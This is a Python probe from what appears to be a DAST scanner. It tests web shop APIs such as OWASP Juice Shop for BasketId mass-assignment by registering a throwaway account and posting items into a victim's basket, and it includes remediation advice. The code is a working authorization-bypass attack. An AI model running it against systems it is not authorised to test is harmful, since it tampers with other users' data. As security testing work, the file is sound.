#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA): basket-id mass-assignment lets caller add items
to ANOTHER user's basket.

The companion `authz_basket_idor_walk` finds the read-side IDOR. This
one finds the write-side: when the API accepts a `BasketId` field on
a POST body the server should be deriving from the caller's session.
A naive ORM .create({...}) on the request body lets the attacker
choose whose basket their items land in.

Detection signal:
  POST /api/BasketItems with `{"BasketId": <victim_id>, ...}` and the
  attacker's auth header → response's `data.BasketId` equals the
  victim id (server accepted the foreign-key field it should have
  overridden from the JWT).

Tested against:
  + OWASP Juice Shop  /api/BasketItems takes BasketId from the body
                      → validated=True.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

BASKET_ITEMS_PATH = "/api/BasketItems"
PRODUCTS_PATH     = "/api/Products"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"basket-mass-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None, "bid": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"]   = auth.get("token")
            out["bid"]     = auth.get("bid") or auth.get("BasketId")
            out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


def _first_product_id(client: SafeClient, origin: str, token: str) -> int | None:
    """Find any valid ProductId so the BasketItems POST is well-formed."""
    r = client.request("GET", urljoin(origin, PRODUCTS_PATH), headers={
        "Authorization": f"Bearer {token}",
    })
    if r.status != 200 or not r.body:
        return None
    try:
        doc = json.loads(r.text)
    except json.JSONDecodeError:
        return None
    rows = doc.get("data") if isinstance(doc, dict) else None
    if isinstance(rows, list):
        for row in rows:
            if isinstance(row, dict) and isinstance(row.get("id"), int):
                return row["id"]
    return None


class BasketManipulationProbe(Probe):
    name = "authz_basket_manipulation"
    summary = ("Detects BasketId mass-assignment: caller can add items "
               "to another user's basket via the BasketItems POST.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--victim-bid", type=int, default=1,
            help="Basket id to target as the victim. Default 1 = the "
                 "seeded admin basket on Juice Shop.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin}."),
                evidence={"origin": origin, "session": {k: v for k, v
                                                        in sess.items()
                                                        if k != "password"}},
            )
        token = sess["token"]
        own_bid = sess.get("bid")
        victim_bid = int(args.victim_bid)
        # If our own basket happens to be the requested victim id (rare
        # — we just registered, our id should be high), pick a different
        # candidate. The probe needs `victim != own` to be meaningful.
        if own_bid is not None and own_bid == victim_bid:
            victim_bid = victim_bid + 1

        product_id = _first_product_id(client, origin, token) or 1

        body = json.dumps({"BasketId": victim_bid,
                           "ProductId": product_id,
                           "quantity": 1}).encode()
        r = client.request("POST", urljoin(origin, BASKET_ITEMS_PATH),
                           headers={"Authorization": f"Bearer {token}",
                                    "Content-Type": "application/json"},
                           body=body)

        attempt = {"path": BASKET_ITEMS_PATH, "status": r.status,
                   "size": r.size, "victim_bid": victim_bid,
                   "own_bid": own_bid}
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "attempt": attempt}

        confirmed = False
        recorded_bid: int | None = None
        if r.status in (200, 201) and r.body:
            try:
                doc = json.loads(r.text)
                data = doc.get("data") if isinstance(doc, dict) else None
                if isinstance(data, dict):
                    rb = data.get("BasketId")
                    if isinstance(rb, int):
                        recorded_bid = rb
                        if rb == victim_bid and (own_bid is None or rb != own_bid):
                            confirmed = True
            except json.JSONDecodeError:
                pass
        attempt["recorded_bid"] = recorded_bid

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: BasketId mass-assignment on "
                         f"{origin}{BASKET_ITEMS_PATH} — server stored "
                         f"the supplied victim id ({victim_bid}) on the "
                         "created BasketItem instead of overriding it "
                         "with the caller's session basket."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Drop `BasketId` from the request schema and derive "
                    "it server-side from the JWT subject's basket. The "
                    "client never has cause to choose whose basket "
                    "their item lands in.\n"
                    "  - Sequelize: pick the controller's allowed-fields "
                    "list, omit BasketId; set it from `req.user.bid`.\n"
                    "  - Or add a row-level authorization step: refuse "
                    "the request if `body.BasketId !== req.user.bid` "
                    "AND the user is not an explicit admin role."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: POST /api/BasketItems on {origin} "
                     f"either rejected the foreign BasketId or stored "
                     "the caller's own id (no cross-basket write)."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BasketManipulationProbe().main()
